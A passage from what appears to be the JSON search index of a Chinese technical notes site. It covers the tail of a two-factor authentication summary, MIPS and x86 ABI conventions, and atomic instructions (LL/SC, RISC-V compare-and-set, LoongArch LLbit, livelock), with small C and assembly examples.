\u200b\u7684\u200b\u751f\u610f\u200b\u3002</p>"},{"location":"software/2fa.html#_1","title":"\u5c0f\u7ed3","text":"<p>\u200b\u603b\u7ed3\u200b\u4e0b\u6765\u200b\uff0c\u200b\u5176\u5b9e\u200b\u5c31\u662f\u200b\u8fd9\u4e48\u200b\u4e00\u4e9b\u200b\u8ba4\u8bc1\u200b\u65b9\u6cd5\u200b\uff1a</p> <ol> <li>\u200b\u5bc6\u7801\u200b</li> <li>\u200b\u77ed\u4fe1\u200b</li> <li>OTP</li> <li>CTAP</li> </ol> <p>\u200b\u89c6\u200b\u5177\u4f53\u60c5\u51b5\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u8981\u6c42\u200b\u5176\u4e2d\u200b\u4e00\u5230\u200b\u591a\u4e2a\u200b\u8ba4\u8bc1\u200b\u65b9\u6cd5\u200b\u3002</p>"},{"location":"software/abi.html","title":"ABI (Application Binary Interface)","text":""},{"location":"software/abi.html#data-model","title":"Data Model","text":"<ul> <li>LP64: long &amp; pointer are 64 bit, int is 32 bit</li> <li>ILP32: long, pointer &amp; int are 32 bit</li> </ul>"},{"location":"software/abi.html#mips","title":"MIPS","text":"<p>MIPS \u200b\u6709\u200b\u591a\u79cd\u200b ABI\uff1a</p> <ol> <li>O32 ABI: original/old 32 \u200b\u4f4d\u200b ILP32 ABI\uff0c32 \u200b\u4f4d\u200b MIPS \u200b\u7528\u200b\u7684\u200b\u591a\u200b\uff0c<code>mips*-linux-gnu</code> target<ol> <li><code>$4-$7($a0-$a3)</code> \u200b\u4f20\u200b\u6574\u6570\u200b\u53c2\u6570\u200b</li> <li><code>$f12-$f15</code> \u200b\u4f20\u200b\u6d6e\u70b9\u200b\u53c2\u6570\u200b</li> <li><code>$2-$3($v0-$v1)</code> \u200b\u4f20\u200b\u8fd4\u56de\u200b\u6570\u636e\u200b</li> <li>16 \u200b\u4e2a\u200b\u6d6e\u70b9\u200b\u5bc4\u5b58\u5668\u200b</li> </ol> </li> <li>N64 ABI: new 64 \u200b\u4f4d\u200b LP64 ABI\uff0c64 \u200b\u4f4d\u200b MIPS \u200b\u7528\u200b\u7684\u200b\u591a\u200b\uff0c<code>mips*64*-linux-gnuabi64</code> target<ol> <li><code>$4-$11($a0-$a7)</code> \u200b\u4f20\u200b\u6574\u6570\u200b\u53c2\u6570\u200b</li> <li><code>$f12-$f19</code> \u200b\u4f20\u200b\u6d6e\u70b9\u200b\u53c2\u6570\u200b</li> <li><code>$2-$3($v0-$v1)</code> \u200b\u4f20\u200b\u8fd4\u56de\u200b\u6570\u636e\u200b</li> <li>32 \u200b\u4e2a\u200b\u6d6e\u70b9\u200b\u5bc4\u5b58\u5668\u200b</li> </ol> </li> <li>N32 ABI\uff1a\u200b\u628a\u200b N64 \u200b\u4ece\u200b LP64 \u200b\u79fb\u690d\u200b ILP32\uff0c\u200b\u5373\u200b\u53ea\u7528\u200b 32 \u200b\u4f4d\u200b\u5730\u5740\u200b\uff0c\u200b\u4f46\u200b\u5bc4\u5b58\u5668\u200b\u8fd8\u662f\u200b 64 \u200b\u4f4d\u200b\uff0c<code>mips*64*-linux-gnuabin32</code> target</li> <li>O64 ABI: \u200b\u628a\u200b O32 \u200b\u79fb\u690d\u200b\u5230\u200b 64 \u200b\u4f4d\u200b\uff0c64 \u200b\u4f4d\u200b\u5bc4\u5b58\u5668\u200b</li> <li>EABI: \u200b\u6709\u200b 32 \u200b\u4f4d\u200b\u548c\u200b 64 \u200b\u4f4d\u200b\u7248\u672c\u200b\uff1aeabi32/eabi64</li> </ol> <p>\u200b\u53c2\u8003\u200b\uff1a</p> <ul> <li>MIPS N32/N64 ABI</li> <li>MIPS N32 ABI</li> <li>MIPS O64 ABI</li> <li>MIPS EABI</li> <li>MIPS ABI History</li> <li>Debian Multiarch triples</li> </ul>"},{"location":"software/abi.html#x86","title":"x86","text":"<ul> <li>i386 abi: i*86-linux-gnu</li> <li>amd64 abi: x86_64-linux-gnu</li> <li>x32 abi: AMD64 \u200b\u4e0a\u200b\u7684\u200b ILP32 ABI\uff0c32 \u200b\u4f4d\u200b\u6307\u9488\u200b\uff0cx86_64-linux-gnux32 target</li> </ul>"},{"location":"software/abi.html#ilp32-on-64-bit","title":"ILP32 on 64-bit","text":"<ul> <li>MIPS N32</li> <li>ARM64 ILP32</li> <li>AMD64 X32 ABI</li> <li>RISC-V 64 ILP32 ABI</li> </ul>"},{"location":"software/atomic_instructions.html","title":"\u539f\u5b50\u200b\u6307\u4ee4","text":"<p>\u200b\u73b0\u5728\u200b\u7684\u200b\u5904\u7406\u5668\u200b\uff0c\u200b\u4e00\u822c\u200b\u4f1a\u200b\u63d0\u4f9b\u200b\u5982\u4e0b\u200b\u51e0\u79cd\u200b\u5f62\u5f0f\u200b\u7684\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\uff1a</p> <ol> <li>LL(Load-Linked)/SC(Store-Conditional)</li> <li>CAS(Compare And Swap)</li> <li>AMO(Atomic Memory Operation)</li> <li>HTM(Hardware Transactional Memory)</li> </ol> <p>\u200b\u5b83\u4eec\u200b\u5728\u200b\u8f6f\u4ef6\u200b\u7684\u200b\u4f7f\u7528\u200b\u65b9\u5f0f\u200b\u548c\u200b\u786c\u4ef6\u200b\u5b9e\u73b0\u200b\u4e0a\u200b\u6709\u6240\u533a\u522b\u200b\uff0c\u200b\u4e0b\u9762\u200b\u6765\u200b\u8ba8\u8bba\u200b\u8fd9\u4e9b\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\u3002</p>"},{"location":"software/atomic_instructions.html#_2","title":"\u80cc\u666f","text":"<p>\u200b\u9996\u5148\u200b\u8ba8\u8bba\u4e00\u4e0b\u200b\u4e3a\u4ec0\u4e48\u200b\u9700\u8981\u200b\u6709\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\u3002\u200b\u5047\u8bbe\u200b\u73b0\u5728\u200b\u6709\u200b\u4e00\u4e2a\u200b\u591a\u7ebf\u7a0b\u200b\u7a0b\u5e8f\u200b\u5728\u200b\u591a\u200b\u6838\u200b\u5904\u7406\u5668\u200b\u4e0a\u200b\u8fd0\u884c\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u7ebf\u7a0b\u200b\u90fd\u200b\u9700\u8981\u200b\u5bf9\u200b\u5185\u5b58\u200b\u4e2d\u200b\u540c\u4e00\u4e2a\u200b\u5730\u5740\u200b\u7684\u200b\u6570\u636e\u200b\u8fdb\u884c\u200b\u52a0\u4e00\u200b\u7684\u200b\u64cd\u4f5c\u200b\u3002\u200b\u5728\u200b\u5904\u7406\u5668\u200b\u4e2d\u200b\uff0c\u200b\u52a0\u4e00\u200b\u7684\u200b\u64cd\u4f5c\u200b\u5b9e\u9645\u4e0a\u200b\u5206\u4e3a\u200b\u4e09\u6b65\u200b\uff1a</p> <ol> <li>\u200b\u4ece\u200b\u5185\u5b58\u200b\u4e2d\u200b\u8bfb\u53d6\u200b\u5f53\u524d\u200b\u7684\u200b\u503c\u200b</li> <li>\u200b\u6c42\u503c\u200b\u52a0\u4e00\u200b\u7684\u200b\u7ed3\u679c\u200b</li> <li>\u200b\u628a\u200b\u52a0\u4e00\u200b\u7684\u200b\u7ed3\u679c\u200b\u5199\u5165\u200b\u5230\u200b\u5185\u5b58\u200b\u4e2d\u200b</li> </ol> <p>\u200b\u4f46\u662f\u200b\u8fd9\u200b\u4e09\u4e2a\u200b\u64cd\u4f5c\u200b\u662f\u200b\u5206\u522b\u200b\u8fdb\u884c\u200b\u7684\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u8fd9\u4e48\u200b\u4e00\u79cd\u200b\u60c5\u51b5\u200b\uff1a</p> <ol> <li>\u200b\u7ebf\u7a0b\u200b\u4e00\u200b\u8bfb\u53d6\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u503c\u200b\u7b49\u4e8e\u200b 0</li> <li>\u200b\u7ebf\u7a0b\u200b\u4e8c\u200b\u8bfb\u53d6\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u503c\u200b\u7b49\u4e8e\u200b 0</li> <li>\u200b\u7ebf\u7a0b\u200b\u4e00\u200b\u8ba1\u7b97\u200b 0 \u200b\u52a0\u200b 1 \u200b\u7b49\u4e8e\u200b 1</li> <li>\u200b\u7ebf\u7a0b\u200b\u4e8c\u200b\u8ba1\u7b97\u200b 0 \u200b\u52a0\u200b 1 \u200b\u7b49\u4e8e\u200b 1</li> <li>\u200b\u7ebf\u7a0b\u200b\u4e00\u628a\u200b 1 \u200b\u5199\u5165\u200b\u5185\u5b58\u200b</li> <li>\u200b\u7ebf\u7a0b\u200b\u4e8c\u200b\u628a\u200b 1 \u200b\u5199\u5165\u200b\u5185\u5b58\u200b</li> </ol> <p>\u200b\u4e8e\u662f\u200b\u52a0\u6cd5\u200b\u7684\u200b\u7ed3\u679c\u200b\u5c31\u200b\u88ab\u200b\u4e22\u5f03\u200b\u4e86\u200b\u3002\u200b\u4e0b\u9762\u200b\u7528\u200b OpenMP \u200b\u7ed9\u51fa\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u4f8b\u5b50\u200b\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\nint count = 0;\nint main() {\n#pragma omp parallel for\n  for (int i = 0; i &lt; 100000; i++) {\n    count++;\n  }\n\n  printf(\"%d\\n\", count);\n  return 0;\n}\n</code></pre> <p>\u200b\u5982\u679c\u200b\u7528\u591a\u6838\u200b\u6267\u884c\u200b\uff0c\u200b\u5f97\u5230\u200b\u7684\u200b\u7ed3\u679c\u200b\u4f1a\u200b\u662f\u200b\u4e00\u4e2a\u200b\u8fdc\u200b\u5c0f\u4e8e\u200b 100000 \u200b\u7684\u200b\u7ed3\u679c\u200b\u3002\u200b\u5982\u679c\u200b\u628a\u200b\u7a0b\u5e8f\u200b\u7ed1\u5b9a\u200b\u5230\u200b\u4e00\u4e2a\u200b\u6838\u5fc3\u200b\u4e0a\u200b\uff08<code>numactl -C 0</code>\uff09\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u5f97\u5230\u200b\u6b63\u786e\u200b\u7684\u200b 100000 \u200b\u7684\u200b\u7ed3\u679c\u200b\u3002\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u7528\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\u6765\u200b\u4fdd\u8bc1\u200b\u66f4\u65b0\u200b\u7684\u200b\u539f\u5b50\u200b\u6027\u200b\u3002</p> <p>\u200b\u5728\u200b\u8ba8\u8bba\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\u7684\u200b\u786c\u4ef6\u200b\u5b9e\u73b0\u200b\u65f6\u200b\uff0c\u200b\u4f1a\u200b\u6d89\u53ca\u200b\u5230\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002\u200b\u5982\u679c\u200b\u5bf9\u200b\u8fd9\u65b9\u9762\u200b\u8fd8\u200b\u7f3a\u4e4f\u200b\u4e86\u89e3\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b \u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b \u200b\u7684\u200b\u5185\u5bb9\u200b\u3002</p>"},{"location":"software/atomic_instructions.html#llsc","title":"LL/SC","text":""},{"location":"software/atomic_instructions.html#_3","title":"\u5b9a\u4e49","text":"<p>LL/SC \u200b\u662f\u200b\u4e00\u5bf9\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5176\u4e2d\u200b LL \u200b\u6307\u4ee4\u200b\u4ece\u200b\u5185\u5b58\u5730\u5740\u200b read_addr \u200b\u4e2d\u200b\u8bfb\u53d6\u6570\u636e\u200b\u5230\u200b\u5bc4\u5b58\u5668\u200b read_data\uff1bSC \u200b\u6307\u4ee4\u200b\u6267\u884c\u200b\u65f6\u200b\uff0c\u200b\u5982\u679c\u200b\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u5185\u5b58\u5730\u5740\u200b write_addr \u200b\u548c\u200b\u4e4b\u524d\u200b\u7528\u200b LL \u200b\u6307\u4ee4\u200b\u8bfb\u53d6\u200b\u7684\u200b\u5185\u5b58\u5730\u5740\u200b read_addr \u200b\u76f8\u540c\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5728\u200b LL \u200b\u6307\u4ee4\u200b\u540e\u200b\uff0c\u200b\u88ab\u200b LL \u200b\u8bbf\u95ee\u200b\u7684\u200b\u5185\u5b58\u200b\u533a\u57df\u200b\uff08\u200b\u7c92\u5ea6\u200b\u53ef\u80fd\u200b\u662f\u200b 32 \u200b\u4f4d\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u66f4\u200b\u7c97\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\uff09\u200b\u6ca1\u6709\u200b\u88ab\u200b\u4fee\u6539\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5199\u5165\u200b\u5bc4\u5b58\u5668\u200b write_data \u200b\u7684\u200b\u503c\u200b\u5230\u200b\u540c\u6837\u200b\u7684\u200b\u5730\u5740\u200b write_addr\uff1b\u200b\u5426\u5219\u200b\u5c31\u200b\u4e0d\u200b\u5199\u5165\u200b\u3002SC \u200b\u6307\u4ee4\u200b\u7684\u200b\u5199\u5165\u200b\u662f\u5426\u200b\u6210\u529f\u200b\uff0c\u200b\u4f1a\u200b\u901a\u8fc7\u200b\u5411\u200b\u76ee\u7684\u200b\u5bc4\u5b58\u5668\u200b dest \u200b\u5199\u5165\u200b\u4e0d\u540c\u200b\u7684\u200b\u503c\u6765\u200b\u533a\u5206\u200b\u3002\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u5982\u679c\u200b SC \u200b\u5199\u5165\u200b\u6210\u529f\u200b\uff0c\u200b\u5c31\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u4ece\u200b LL \u200b\u5230\u200b SC \u200b\u8fd9\u200b\u6bb5\u65f6\u95f4\u200b\u5185\u200b\uff0c\u200b\u8fd9\u200b\u6bb5\u200b\u5185\u5b58\u200b\u6ca1\u6709\u200b\u88ab\u200b\u6539\u53d8\u200b\u3002</p>"},{"location":"software/atomic_instructions.html#_4","title":"\u5e38\u89c1\u200b\u7528\u6cd5","text":"<p>LL/SC \u200b\u7684\u200b\u901a\u5e38\u200b\u7528\u6cd5\u200b\u662f\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u4e00\u4e2a\u200b\u8bfb\u200b - \u200b\u6539\u200b - \u200b\u5199\u200b\uff08read-modify-write\uff09\u200b\u64cd\u4f5c\u200b\uff1a\u200b\u9996\u5148\u200b\u7528\u200b LL \u200b\u6307\u4ee4\u200b\u8bfb\u53d6\u200b\u5185\u5b58\u200b\uff0c\u200b\u7136\u540e\u200b\u5bf9\u200b\u5bc4\u5b58\u5668\u200b\u8fdb\u884c\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u518d\u7528\u200b SC \u200b\u6307\u4ee4\u200b\u628a\u200b\u7ed3\u679c\u200b\u5199\u5165\u200b\u5185\u5b58\u200b\uff1a\u200b\u5982\u679c\u200b\u4e2d\u9014\u200b\u5185\u5b58\u200b\u7684\u200b\u503c\u200b\u88ab\u200b\u5176\u4ed6\u200b\u5904\u7406\u5668\u200b\u6838\u5fc3\u200b\u4fee\u6539\u200b\u4e86\u200b\uff0c\u200b\u90a3\u4e48\u200b\u7528\u200b LL \u200b\u6307\u4ee4\u200b\u8bfb\u53d6\u200b\u7684\u200b\u7ed3\u679c\u200b\u662f\u200b\u65e7\u200b\u7684\u200b\uff0c\u200b\u7528\u200b\u7684\u200b\u4e5f\u200b\u662f\u200b\u65e7\u200b\u7684\u200b\u503c\u200b\u505a\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u8ba1\u7b97\u7ed3\u679c\u200b\u5c31\u200b\u4e0d\u4f1a\u200b\u88ab\u200b SC \u200b\u5199\u8fdb\u53bb\u200b\uff1b\u200b\u5426\u5219\u200b\uff0c\u200b\u8bf4\u660e\u200b LL \u200b\u6307\u4ee4\u200b\u8bfb\u53d6\u200b\u7684\u200b\u503c\u200b\u548c\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u503c\u200b\u662f\u200b\u76f8\u540c\u200b\u7684\u200b\uff0cSC \u200b\u6307\u4ee4\u200b\u628a\u200b\u66f4\u65b0\u200b\u540e\u200b\u7684\u200b\u7ed3\u679c\u200b\u5199\u5165\u200b\u5230\u200b\u5185\u5b58\u200b\u4e2d\u200b\u3002</p> <p>\u200b\u56e0\u6b64\u200b LL/SC \u200b\u5728\u200b\u4f7f\u7528\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u901a\u5e38\u200b\u4f1a\u200b\u548c\u200b\u5faa\u73af\u200b\u653e\u5728\u200b\u4e00\u8d77\u200b\u7528\u200b\uff1a\u200b\u5982\u679c\u200b SC \u200b\u5931\u8d25\u200b\uff0c\u200b\u5c31\u200b\u91cd\u65b0\u200b\u5f00\u59cb\u200b\u8bfb\u200b - \u200b\u6539\u200b - \u200b\u5199\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u76f4\u5230\u200b SC \u200b\u6210\u529f\u200b\u3002\u200b\u7528\u200b LL/SC \u200b\u5b9e\u73b0\u200b\u5bf9\u200b\u5185\u5b58\u200b\u8fdb\u884c\u200b\u539f\u5b50\u200b\u52a0\u4e00\u200b\u64cd\u4f5c\u200b\uff08Atomic Add One\uff09\u200b\u7684\u200b\u4f2a\u200b\u4ee3\u7801\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>loop:\n    # Read\n    ll data, addr\n    # Modify\n    add data, data, 1\n    # Write\n    sc result, data, addr\n    # Try again if SC failed\n    goto loop if failed\n</code></pre>"},{"location":"software/atomic_instructions.html#_5","title":"\u6307\u4ee4\u96c6\u200b\u67b6\u6784\u200b\u652f\u6301","text":"<p>\u200b\u5728\u200b RISC-V \u200b\u7684\u200b A \u200b\u6269\u5c55\u200b\u4e2d\u200b\uff0cLL \u200b\u6307\u4ee4\u200b\u53eb\u505a\u200b LR\uff08Load-Reserved\uff09\uff0cSC \u200b\u6307\u4ee4\u200b\u8fd8\u662f\u200b\u53eb\u505a\u200b SC\u3002\u200b\u4e0b\u9762\u200b\u662f\u200b RISC-V \u200b\u6307\u4ee4\u96c6\u200b\u624b\u518c\u200b\u4e2d\u200b\u7ed9\u51fa\u200b\u7684\u200b\u4e00\u6bb5\u200b\u7528\u200b LL/SC \u200b\u5b9e\u73b0\u200b\u539f\u5b50\u200b\u6bd4\u8f83\u200b\u548c\u200b\u5199\u5165\u200b\uff08Atomic Compare And Set\uff09\u200b\u64cd\u4f5c\u200b\u7684\u200b\u4ee3\u7801\u200b\uff1a</p> <pre><code>    # a0 holds address of memory location\n    # a1 holds expected value\n    # a2 holds desired value\n    # a0 holds return value, 0 if successful, !0 otherwise\ncas:\n    lr.w t0, (a0)        # Load original value.\n    bne t0, a1, fail     # Doesn't match, so fail.\n    sc.w t0, a2, (a0)    # Try to update.\n    bnez t0, cas         # Retry if store-conditional failed.\n    li a0, 0             # Set return to success.\n    jr ra                # Return.\nfail:\n    li a0, 1             # Set return to failure.\n    jr ra                # Return.\n</code></pre> <p>\u200b\u4ee3\u7801\u200b\u5229\u7528\u200b LL/SC \u200b\u6307\u4ee4\u200b\uff0c\u200b\u628a\u200b a0 \u200b\u6307\u5411\u200b\u7684\u200b\u5185\u5b58\u200b\u7684\u200b\u503c\u200b\u548c\u200b a1 \u200b\u7684\u200b\u503c\u200b\u6bd4\u8f83\u200b\uff0c\u200b\u5982\u679c\u200b\u76f8\u7b49\u200b\uff0c\u200b\u5c31\u200b\u628a\u200b a2 \u200b\u5199\u200b\u5230\u200b a0 \u200b\u6307\u5411\u200b\u7684\u200b\u5185\u5b58\u200b\uff0c\u200b\u8fd4\u56de\u200b\u6210\u529f\u200b\uff1b\u200b\u5982\u679c\u200b\u4e0d\u200b\u76f8\u7b49\u200b\uff0c\u200b\u5219\u200b\u4e0d\u200b\u4fee\u6539\u200b\u5185\u5b58\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u8fd4\u56de\u200b\u9519\u8bef\u200b\u3002</p> <p>\u200b\u9664\u4e86\u200b\u5185\u5b58\u200b\u88ab\u200b\u5176\u4ed6\u200b\u5904\u7406\u5668\u200b\u6838\u5fc3\u200b\u5199\u5165\u200b\u4f1a\u200b\u5bfc\u81f4\u200b SC \u200b\u5931\u8d25\u200b\u4ee5\u5916\u200b\uff0c\u200b\u4e00\u4e9b\u200b\u6307\u4ee4\u96c6\u200b\u67b6\u6784\u200b\u5141\u8bb8\u200b\u7a0b\u5e8f\u200b\u624b\u52a8\u200b\u8ba9\u200b SC \u200b\u5931\u8d25\u200b\uff0c\u200b\u4ee5\u200b LoongArch \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u6807\u51c6\u200b\u8981\u6c42\u200b\uff1a</p> <p>LL.{W/D} \u200b\u6267\u884c\u200b\u65f6\u200b\u8bb0\u5f55\u200b\u4e0b\u200b\u8bbf\u95ee\u200b\u5730\u5740\u200b\u5e76\u7f6e\u200b\u4e0a\u200b\u4e00\u4e2a\u200b\u6807\u8bb0\u200b\uff08LLbit \u200b\u7f6e\u200b\u4e3a\u200b 1\uff09\uff0cSC.{W/D} \u200b\u6307\u4ee4\u200b\u6267\u884c\u200b\u65f6\u4f1a\u200b\u67e5\u770b\u200b LLbit\uff0c\u200b\u4ec5\u5f53\u200b LLbit \u200b\u4e3a\u200b 1 \u200b\u65f6\u624d\u200b\u771f\u6b63\u200b\u4ea7\u751f\u200b\u5199\u200b\u52a8\u4f5c\u200b\uff0c\u200b\u5426\u5219\u200b\u4e0d\u5199\u200b\u3002\u200b\u5728\u200b\u914d\u5bf9\u200b\u7684\u200b LL-SC \u200b\u6267\u884c\u200b\u671f\u95f4\u200b\uff0c\u200b\u4e0b\u5217\u200b\u4e8b\u4ef6\u200b\u4f1a\u200b\u8ba9\u200b LLbit \u200b\u6e05\u200b 0:</p> <ul> <li>\u200b\u6267\u884c\u200b\u4e86\u200b ERTN \u200b\u6307\u4ee4\u200b\u4e14\u200b\u6267\u884c\u200b\u65f6\u200b CSR.LLBCTL \u200b\u4e2d\u200b\u7684\u200b KLO \u200b\u4f4d\u200b\u4e0d\u200b\u7b49\u4e8e\u200b 1;</li> <li>\u200b\u5176\u5b83\u200b\u5904\u7406\u5668\u200b\u6838\u200b\u6216\u200b Cache Coherent master \u200b\u5bf9\u200b\u8be5\u200b LLbit \u200b\u5bf9\u5e94\u200b\u7684\u200b\u5730\u5740\u200b\u6240\u5728\u200b\u7684\u200b Cache \u200b\u884c\u200b\u6267\u884c\u200b\u5b8c\u6210\u200b\u4e86\u200b\u4e00\u4e2a\u200b store \u200b\u64cd\u4f5c\u200b\u3002</li> </ul> <p>\u200b\u8fd9\u6837\u200b\u505a\u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\uff0c\u200b\u5982\u679c\u200b\u5728\u200b LL \u200b\u548c\u200b SC \u200b\u4e4b\u95f4\u200b\u89e6\u53d1\u200b\u4e86\u200b\u4e0a\u4e0b\u6587\u200b\u5207\u6362\u200b\uff0c\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u53ef\u4ee5\u200b\u628a\u200b SC \u200b\u81ea\u52a8\u200b\u53d6\u6d88\u200b\u6389\u200b\uff0c\u200b\u8be6\u60c5\u200b\u53ef\u4ee5\u200b\u770b\u200b LoongArch \u200b\u7684\u200b CSR.LLBCTL \u200b\u7684\u200b\u5b9a\u4e49\u200b\u3002</p> <p>\u200b\u5176\u4ed6\u200b\u5b9e\u73b0\u200b\u4e86\u200b LL/SC \u200b\u7684\u200b\u6307\u4ee4\u96c6\u200b\u67b6\u6784\u200b\uff1a</p> <ul> <li>Alpha: ldl_l/stl_c, ldq_l/stq_c</li> <li>PowerPC/Power ISA: lwarx/stwcx, ldarx/stdcx</li> <li>MIPS: ll/sc, llwp/scwp(Double Width)</li> <li>ARM: ldrex/strex(ARMv6 &amp; ARMv7), ldxr/stxr(ARMv8), ldxp/stxp(Double Width, ARMv8)</li> <li>ARC: llock/scond</li> </ul> <p>\u200b\u5b9e\u9645\u200b\u5b9e\u73b0\u200b\u65f6\u200b\uff0c\u200b\u6839\u636e\u200b\u5904\u7406\u5668\u200b\u5b9e\u73b0\u200b\u4e0d\u540c\u200b\uff0c\u200b\u68c0\u6d4b\u200b\u5185\u5b58\u200b\u8bbf\u95ee\u200b\u7684\u200b\u7c92\u5ea6\u200b\u53ef\u80fd\u200b\u4e0d\u540c\u200b\u3002</p>"},{"location":"software/atomic_instructions.html#_6","title":"\u786c\u4ef6\u200b\u5b9e\u73b0","text":"<p>\u200b\u5728\u200b\u5904\u7406\u5668\u200b\u4e2d\u200b\uff0cLL/SC \u200b\u7684\u200b\u5b9e\u73b0\u200b\u5e76\u200b\u4e0d\u200b\u590d\u6742\u200b\uff1a\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u4e0b\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u5f53\u200b\u4e00\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u88ab\u200b\u66f4\u65b0\u200b\u7684\u200b\u65f6\u200b\uff0c\u200b\u6240\u6709\u200b\u62e5\u6709\u200b\u8be5\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u6838\u5fc3\u200b\u90fd\u200b\u4f1a\u200b\u88ab\u200b\u901a\u77e5\u200b\u5230\u200b\u3002\u200b\u56e0\u6b64\u200b\uff0cLL \u200b\u6307\u4ee4\u200b\u53ea\u200b\u9700\u8981\u200b\u5728\u200b\u8bfb\u53d6\u200b\u7f13\u5b58\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u5728\u200b\u7f13\u5b58\u200b\u4e0a\u200b\u6253\u200b\u4e00\u4e2a\u200b\u6807\u8bb0\u200b\uff1b\u200b\u901a\u8fc7\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\uff0c\u200b\u5982\u679c\u200b\u53d1\u73b0\u200b\u6709\u200b\u5176\u4ed6\u200b\u6838\u5fc3\u200b\u8981\u200b\u5199\u5165\u200b LL \u200b\u6307\u4ee4\u200b\u8bfb\u53d6\u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\uff0c\u200b\u6216\u8005\u200b\u8be5\u200b\u7f13\u5b58\u200b\u884c\u8981\u200b\u88ab\u200b Evict\uff0c\u200b\u90a3\u200b\u5c31\u200b\u8bb0\u5f55\u200b\u4e00\u4e2a\u200b SC \u200b\u5931\u8d25\u200b\u6807\u8bb0\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u4e0b\u200b\u4e00\u6b21\u200b SC \u200b\u6307\u4ee4\u200b\u5931\u8d25\u200b\u3002\u200b\u5b9e\u73b0\u200b SC \u200b\u6307\u4ee4\u200b\u65f6\u200b\uff0c\u200b\u9996\u5148\u200b\u68c0\u67e5\u200b\u5b83\u200b\u7684\u200b\u5730\u5740\u200b\u662f\u5426\u200b\u548c\u200b LL \u200b\u6307\u4ee4\u200b\u76f8\u540c\u200b\uff0c\u200b\u5982\u679c\u200b\u76f8\u540c\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6ca1\u6709\u200b\u89e6\u53d1\u200b SC \u200b\u5931\u8d25\u200b\u6807\u8bb0\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u8fdb\u884c\u200b\u5b9e\u9645\u200b\u7684\u200b\u5199\u5165\u200b\u3002\u200b\u4f2a\u200b\u4ee3\u7801\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>Init() {\n    LLvalid = 0;\n    LLaddr = 0;\n}\n\nLL(addr) {\n    data = memory[addr];\n    LLaddr = addr;\n    LLvalid = 1;\n    return data;\n}\n\nSC(addr, data) {\n    if (LLaddr == addr &amp;&amp; LLvalid) {\n        memory[addr] = data;\n        return SUCCESS;\n    } else {\n        return FAIL;\n    }\n}\n\nInvalidate(addr) {\n    if (addr == LLaddr) {\n        LLvalid = 0;\n    }\n}\n</code></pre>"},{"location":"software/atomic_instructions.html#_7","title":"\u6d3b\u9501","text":"<p>LL/SC \u200b\u5728\u200b\u4f7f\u7528\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6f5c\u5728\u200b\u7684\u200b\u4e00\u4e2a\u200b\u95ee\u9898\u200b\u662f\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u6d3b\u9501\u200b\uff1a\u200b\u5f53\u200b LL \u200b\u548c\u200b SC \u200b\u4e4b\u95f4\u200b\u6267\u884c\u200b\u7684\u200b\u6307\u4ee4\u200b\u6bd4\u8f83\u200b\u591a\u200b\uff0c\u200b\u82b1\u8d39\u200b\u7684\u200b\u65f6\u95f4\u200b\u6bd4\u8f83\u200b\u957f\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f7f\u5f97\u200b LL/SC \u200b\u4e00\u76f4\u200b\u88ab\u200b\u5176\u4ed6\u200b\u6838\u5fc3\u200b\u6253\u65ad\u200b\uff0c\u200b\u6ca1\u6709\u200b\u529e\u6cd5\u200b\u5b9e\u73b0\u200b\u8fdb\u5c55\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u7f16\u5199\u200b LL/SC 